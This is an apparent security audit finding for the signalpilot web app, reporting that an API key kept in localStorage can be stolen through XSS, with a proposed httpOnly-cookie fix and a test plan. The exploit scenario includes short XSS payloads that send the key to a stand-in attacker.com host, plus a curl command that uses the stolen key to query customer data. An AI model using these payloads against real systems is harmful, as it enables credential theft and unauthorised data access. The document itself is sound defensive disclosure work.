# API key persisted in `localStorage.sp_api_key` — exfiltratable by any XSS

- Slug: localstorage-stores-api-key-vulnerable-to-xss
- Severity: Medium
- Cloud impact: Yes
- Confidence: High
- Affected files / endpoints: `signalpilot/web/lib/api.ts:30-55`

Back to [issues.md](issues.md)

---

## Problem

The local API key is fetched from `/api/local-key` and stored in `localStorage`:

```typescript
// lib/api.ts:30-36
return fetch("/api/local-key")
  .then((r) => r.ok ? r.json() : null)
  .then((data) => {
    if (data?.key) {
      localStorage.setItem("sp_api_key", data.key);  // stored in localStorage
      return data.key as string;
    }
    ...
  })
```

The key is then read back from `localStorage` on every request:

```typescript
// lib/api.ts:39-46
function getApiKey(): string | null {
  if (typeof window === "undefined") return null;
  const stored = localStorage.getItem("sp_api_key");
  if (stored) return stored;
  ...
}
```

`localStorage` is accessible to any JavaScript running on the same origin. With `'unsafe-inline'` in the CSP (finding [csp-allows-unsafe-inline-and-unsafe-eval](csp-allows-unsafe-inline-and-unsafe-eval-proposal.md)), any XSS vector can execute:

```javascript
const key = localStorage.getItem('sp_api_key');
fetch('https://attacker.com/steal?key=' + key);
```

In cloud mode, the Clerk JWT is used (not `localStorage`), which is more secure. However:
1. If a user has ever used local mode before switching to cloud, the `sp_api_key` from local mode may remain in `localStorage`.
2. The `setApiKey` function (line 49-55) can write any key to `localStorage`, including cloud-issued API keys if a UI component calls it.
3. API keys displayed in the settings UI (masked but sometimes copyable) may end up cached by auto-fill or a compromised browser extension.

---

## Impact

- **Local mode (current):** `localStorage` key exfiltrated by XSS → attacker has gateway API key → full access to local connections and data.
- **Cloud mode (residual risk):** If cloud-mode API keys (the `sp_...` keys from the cloud settings page) are ever stored in `localStorage` by a UI component, they are equally exfiltratable.
- **Attack surface:** Any XSS vector in the app (amplified by CSP `'unsafe-inline'`) leads to API key theft.

---

## Exploit scenario

1. Attacker injects XSS via a crafted query result (or any other injection surface).
2. Victim (local mode user) views the page:

```javascript
// XSS payload:
const key = localStorage.getItem('sp_api_key');
if (key) {
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify({key}));
}
```

3. Attacker receives `sp_local_abc123...`.
4. From the attacker's machine (on the same network as the victim's gateway):

```bash
curl http://victim-gateway:3300/api/query \
  -H "X-API-Key: sp_local_abc123..." \
  -d '{"connection_name":"prod","query":"SELECT * FROM customers"}'
```

---

## Affected surface

- Files: `signalpilot/web/lib/api.ts:30-55`
- Endpoints: All endpoints — key provides access to entire gateway API
- Auth modes: Local mode (primary); cloud mode if cloud keys stored in localStorage

---

## Proposed fix

**For local mode key — prefer httpOnly cookie:**

Instead of storing in `localStorage`, use a server-set `httpOnly` cookie via the `/api/local-key` route:

```typescript
// app/api/local-key/route.ts — set cookie instead of returning key:
export async function GET() {
  const key = process.env.SP_LOCAL_API_KEY;
  if (!key) return NextResponse.json({ ok: false });

  const response = NextResponse.json({ ok: true });
  response.cookies.set("sp_local_key", key, {
    httpOnly: true,
    sameSite: "strict",
    secure: process.env.NODE_ENV === "production",
    path: "/",
  });
  return response;
}
```

On the gateway, read the cookie from the request instead of the `Authorization` header for the local-mode key. The browser sends the cookie automatically without JavaScript being able to read it.

**If localStorage must be kept for backward compat:**
- Clear the localStorage key immediately after the Clerk JWT is available in cloud mode.
- Add a cleanup on cloud-mode page load:

```typescript
// In cloud-mode initialization:
if (IS_CLOUD_MODE) {
  localStorage.removeItem("sp_api_key");
}
```

**Audit all `setApiKey` call sites** to ensure no cloud-issued keys are stored in `localStorage`.

---

## Verification / test plan

**Unit tests:**
1. `test_local_key_not_stored_in_localstorage` — after fix, assert `localStorage.getItem("sp_api_key")` is null.
2. `test_cloud_mode_clears_localstorage_key` — cloud mode init clears any residual local key.

**Manual checklist:**
- Load local-mode app.
- Open browser DevTools → Application → Local Storage.
- Before fix: `sp_api_key` is visible. After fix (cookie approach): no key in LocalStorage.
- Verify XSS cannot access the key: inject `alert(localStorage.getItem('sp_api_key'))`. Should return `null`.

---

## Rollout / migration notes

- **Breaking change:** The `getApiKey()` function reads from localStorage; changing to httpOnly cookie requires updating the request auth logic in `lib/api.ts` to not send the `Authorization: Bearer` header (the cookie is sent automatically by the browser).
- However, the gateway must accept the cookie for local-mode auth — this requires changes to `APIKeyAuthMiddleware` or the gateway's cookie handling.
- **Phased approach:** In the first phase, just clear localStorage in cloud mode. In phase 2, migrate to httpOnly cookies for local mode.
- Rollback: revert to localStorage-based approach.

**Related findings:** [csp-allows-unsafe-inline-and-unsafe-eval](csp-allows-unsafe-inline-and-unsafe-eval-proposal.md), [local-key-route-exposes-key-without-auth-in-local-mode](local-key-route-exposes-key-without-auth-in-local-mode-proposal.md)
